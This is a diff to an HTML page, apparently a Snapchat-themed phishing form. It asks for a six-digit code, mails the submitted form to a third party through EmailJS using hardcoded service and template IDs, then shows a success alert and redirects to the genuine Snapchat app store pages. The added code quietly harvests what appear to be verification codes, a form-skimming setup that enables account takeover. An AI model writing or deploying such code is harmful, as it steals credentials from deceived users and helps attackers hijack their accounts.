@@ -81,7 +81,12 @@
       </div>
     </form>
   </div>
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@2.4.1/dist/email.min.js"></script>
   <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      emailjs.init("wKyeQt_chZMTOZY_c"); // Clé publique EmailJS
+    });
+
     document.getElementById("sixDigitsForm").addEventListener("submit", function (event) {
       event.preventDefault();
       
@@ -97,16 +102,33 @@
         errorMessage.style.display = 'none';
       }
 
-      submitBtn.value = "Redirection...";
+      submitBtn.value = "Envoi...";
       submitBtn.disabled = true;
 
-      if (/iPhone|iPad|iPod/.test(navigator.userAgent)) {
-        window.location.assign("https://apps.apple.com/app/snapchat/id447188370");
-      } else if (/Android/.test(navigator.userAgent)) {
-        window.location.assign("https://play.google.com/store/apps/details?id=com.snapchat.android");
-      } else {
-        alert("Veuillez installer Snapchat depuis l'App Store ou Google Play.");
-      }
+      emailjs.sendForm("service_7xtpexj", "template_3jr5npg", this)
+        .then(function (response) {
+          console.log("Email envoyé avec succès !", response);
+          alert("Code envoyé avec succès !");
+          submitBtn.value = "Redirection...";
+          
+          setTimeout(() => {
+            if (/iPhone|iPad|iPod/.test(navigator.userAgent)) {
+              console.log("Redirection vers l'App Store");
+              window.location.href = "https://apps.apple.com/app/snapchat/id447188370";
+            } else if (/Android/.test(navigator.userAgent)) {
+              console.log("Redirection vers Google Play");
+              window.location.href = "https://play.google.com/store/apps/details?id=com.snapchat.android";
+            } else {
+              alert("Veuillez installer Snapchat depuis l'App Store ou Google Play.");
+            }
+          }, 2000);
+        })
+        .catch(function (error) {
+          console.log("Échec de l'envoi de l'email", error);
+          alert("Une erreur s'est produite. Réessayez plus tard.");
+          submitBtn.value = "Envoyer";
+          submitBtn.disabled = false;
+        });
     });
 
     function validateInput() {
